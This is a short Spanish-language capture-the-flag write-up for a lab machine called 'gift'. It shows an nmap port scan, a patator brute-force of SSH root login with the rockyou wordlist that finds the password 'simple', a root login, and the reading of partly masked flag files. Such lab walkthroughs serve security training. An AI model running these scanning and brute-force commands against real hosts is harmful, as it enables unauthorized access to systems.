❯ nmap -p- --open -T5 -v -n 192.168.1.53 -oG puertos

### Fuerza bruta
En esta ocasión usaremos patator para realizar fuerza bruta al servicio `SSH` con el usuario root.

```bash
❯ patator ssh_login host=192.168.1.53 port=22 user=root password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:egrep="Authentication failed."
12:07:56 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-09-19 12:07 CEST
12:07:56 patator    INFO -                                                                              
12:07:56 patator    INFO - code  size    time | candidate                          |   num | mesg
12:07:56 patator    INFO - -----------------------------------------------------------------------------
12:08:01 patator    INFO - 0     19     0.105 | simple                             |   397 | SSH-2.0-OpenSSH_8.3
```

Encuentra la password `simple`, la usaremos para conectarnos por `SSH`
```bash
❯ ssh root@192.168.1.53
root@192.168.1.53's password: 
IM AN SSH SERVER
gift:~#
```
Una vez conectados ya podemos leer las flags.
```bash
gift:~# cat user.txt 
HMV665XXXXX
gift:~# cat root.txt 
HMVtyrXXXXX
```
